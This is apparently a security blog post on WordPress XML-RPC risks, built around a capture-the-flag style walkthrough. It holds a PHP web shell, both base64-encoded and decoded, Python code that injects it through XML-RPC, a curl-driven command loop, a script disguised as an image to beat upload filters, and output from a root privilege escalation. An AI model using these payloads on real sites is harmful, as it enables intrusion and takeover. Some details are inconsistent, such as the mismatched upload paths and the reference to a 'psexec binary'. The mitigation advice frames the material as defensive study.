---
title: "Understanding XML-RPC in WordPress: Operation, Risks, and Exploitation"
date: 2022-08-05 13:02:04
categories: [wordpress-vulnerabilies]
tags: [wordpress, xmlrpc]
---

XML-RPC is a remote programming interface that allows for the communication and manipulation of data on a WordPress site programmatically. Originally designed to facilitate complex communication between distinct systems, XML-RPC in WordPress allows external applications to perform actions such as publishing posts, retrieving post data, and managing users without needing to use the standard web interface of WordPress.

## How Does XML-RPC Work in WordPress?

The XML-RPC protocol functions as a bridge between WordPress and external applications, such as mobile apps, other websites, and automation systems. It uses XML to transport messages and typically operates over HTTP. In the context of WordPress, the xmlrpc.php file serves as the access point for this service, enabling the execution of a variety of predefined methods that can manipulate nearly all aspects of the site.

## The Dangers of Keeping XML-RPC Enabled

Despite its utilities, leaving XML-RPC enabled brings several security concerns:

- **Brute Force Attacks:** XML-RPC can be used to carry out mass brute force attacks against the wp-login.php. This is especially critical because, through XML-RPC, it is possible to attempt to authenticate multiple usernames and passwords with a single request.
- **DDoS Amplification:** XML-RPC can be abused in denial of service (DDoS) attacks, where an attacker uses the system.multicall method to execute multiple actions in a single request, amplifying the impact on the target server.
- **Exploitation of Vulnerabilities:** The interface can be exploited to use specific vulnerabilities, such as the injection of malicious commands that can be executed on the server, if WordPress and its plugins are not properly updated and configured.

## Exploitation of Vulnerability Through XML-RPC

As seen in the example detailed previously, XML-RPC can be a vector for significant attacks. In the described case, the hacker exploited the functionality of XML-RPC to execute remote commands through manipulated calls. After verifying that XML-RPC was enabled and accessible, the attacker used methods such as wp.getPosts and wp.newPost, and eventually exploited specific vulnerabilities through malicious scripts inserted in posts.

One of the most critical methods exploited was htb.get_flag, apparently a custom function that returned a security flag, a typical component in hacking competitions. This exploitation was facilitated by the lack of appropriate restrictions on the use of XML-RPC, demonstrating how powerful functions can be abused if not properly protected.

## Security Recommendations

To mitigate the risks associated with XML-RPC in WordPress, it is recommended:

- **Disable XML-RPC when not in use.** This can be done through specific plugins or by modifying the .htaccess file to block access to xmlrpc.php.
- **Limit access to xmlrpc.php** using firewall rules or web server settings to allow only trusted IPs.
- **Monitor and audit the use of XML-RPC** to detect and respond to suspicious activities quickly.
- **Keep WordPress and plugins updated,** ensuring that the latest security measures and vulnerability fixes are applied.

In summary, while XML-RPC offers practical functionalities for integration with other systems and devices, it is crucial to be aware of the associated security risks and take necessary measures to protect your WordPress site from potential abuses of this powerful API.

# Exploitation:
If you have administrator access on a WordPress site, even with a two-factor authentication (2FA) plugin, it is possible to exploit XML-RPC to execute arbitrary commands, including obtaining shell privileges. Using the Python WordPress XML-RPC library, as documented at [https://python-wordpress-xmlrpc.readthedocs.io/en/latest/overview.html](https://python-wordpress-xmlrpc.readthedocs.io/en/latest/overview.html), you can manipulate posts and potentially insert malicious PHP code.

### Arbitrary Commands:
When the system is susceptible to code injection, we can manipulate the post's content using Python as shown below:

```python
from wordpress_xmlrpc import Client
from wordpress_xmlrpc.methods import posts

# Connecting to the XML-RPC server
client = Client("http://host_ip_address/xmlrpc.php", 'admin', 'password')

# Fetching posts
post = client.call(posts.GetPosts())
post_details = post[0]
print(post_details.content)  # Outputs the content of the first post
```

The original post content included a base64 encoded PHP info script (`<?php phpinfo(); ?>`). This base64 string ("PD9waHAgcGhwaW5mbygpOyA/Pg==") could be replaced with a malicious command like:

```base64
PD9waHAKCWVjaG8gIjxwcmU+IiAuIHNoZWxsX2V4ZWMoJF9SRVFVRVNUWydjbWQnXSkgLiAiPC9wcmU+IjsKPz4K
```

Which decodes to:

```php
<?php
echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Suppose the system allows code injection. We could inject malicious PHP code through the post content:

```python
# Inserting malicious PHP code via post content
post[0].content = '<!-- wp:paragraph --><p>[Malicious code here]</p><!-- /wp:paragraph -->'
client.call(posts.EditPost(post[0].id, post))
```

To create a reverse shell in bash, you can use the following script:

```bash
#!/bin/bash

# Catching Ctrl+C
function ctrl_c(){
    echo -e "\n[!] Exiting..\n"
    exit 1
}

trap ctrl_c INT

main_url="http://host_ip_address/index.php/2022/01/28/hello-world/?cmd="

while [ "$command" != "exit" ]; do
    echo -n "$~ " && read -r command
    command=$(echo "$command 2>%261" | tr ' ' '+')
    curl -s -X GET "$main_url$command" | sed 's/<pre>//' | sed 's/<\/pre>//'
done
```

Additionally, to escalate privileges on the system, methods like those described at [https://github.com/kimusan/pkwner](https://github.com/kimusan/pkwner) can be utilized. These methods take advantage of known vulnerabilities to gain root access, often through the `psexec` binary.

Finally, to bypass file upload restrictions, you can disguise bash scripts as images and upload them via Python using XML-RPC:

```python
from wordpress_xmlrpc import Client, media
from wordpress_xmlrpc.methods import media

client = Client("http://host_ip_address/xmlrpc.php", 'admin', 'password')
with open("pkwner.sh", "r") as f:
    file = f.read()
fileToUpload = { 'name': 'a.png', 'bits': file, 'type': 'text/plain' }
response = client.call(media.UploadFile(fileToUpload))
print(response)
```

### Result of File Upload Exploitation:
The result of our file upload using XML-RPC was successful, demonstrating the ability to bypass security filters. The file upload result was:

```python
>>> client.call(media.UploadFile(fileToUpload))
{'attachment_id': '52', 'date_created_gmt': <DateTime '20240425T10:26:49' at 0x7fbc59f43710>, 'parent': 0, 'link': '/wp-content/uploads/2022/04/a.png', 'title': 'a.png', 'caption': '', 'description': '', 'metadata': False, 'type': 'text/plain', 'thumbnail': '/wp-content/uploads/2022/04/a.png', 'id': '52', 'file': 'a.png', 'url': '/wp-content/uploads/2022/04/a.png'}
```

Afterward, running the script as a privileged user could be possible, accessing the file as if it were an image but actually executing it as a bash script. This demonstrates an effective way to circumvent security measures and exploit system privileges.

```bash
$~ bash /var/www/html/wp-content/uploads/2024/04/a.png

██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗ 
██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗
██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║
╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
CVE-2021-4034 PoC by Kim Schulz
[+] Setting up environment...
[+] Build offensive gconv shared module...
[+] Build mini executor...
uid=0(root) gid=0(root) groups=0(root),33(www-data)
hello[+] Nice Job
```

## Mitigation Strategies for XML-RPC Exploitation in WordPress

Exploiting WordPress via XML-RPC can lead to unauthorized command execution and privilege escalation. To mitigate such vulnerabilities, consider implementing the following strategies:

### 1. Disable XML-RPC
If XML-RPC is not needed for your WordPress site, it is safer to disable it entirely. This can be done by adding the following code to your `.htaccess` file:

```apache
<Files "xmlrpc.php">
Order Allow,Deny
Deny from all
</Files>
```

### 2. Use Strong Authentication
Ensure that strong, unique passwords are used for all user accounts and enforce two-factor authentication (2FA) to add an extra layer of security.

### 3. Limit Access by IP
Restrict access to the `xmlrpc.php` file to only known IPs that require access. This can be done through your `.htaccess` file:

```apache
<Files "xmlrpc.php">
Order Deny,Allow
Deny from all
Allow from 192.0.2.1/24  # Replace with your IP range
</Files>
```

### 4. Monitor and Audit Logs
Regularly monitor and audit your server logs for any unusual activities that could indicate XML-RPC misuse. Tools like Fail2Ban can be configured to watch for malicious activity patterns and block offending IP addresses.

### 5. Update and Patch Regularly
Keep your WordPress core, plugins, and themes updated to the latest versions. Security patches are often included in updates to close vulnerabilities.

### 6. Security Plugins
Consider installing security plugins that specifically prevent XML-RPC attacks by filtering requests and blocking known attack vectors.

Implementing these mitigation strategies will significantly reduce the risk of XML-RPC exploitation in WordPress sites.

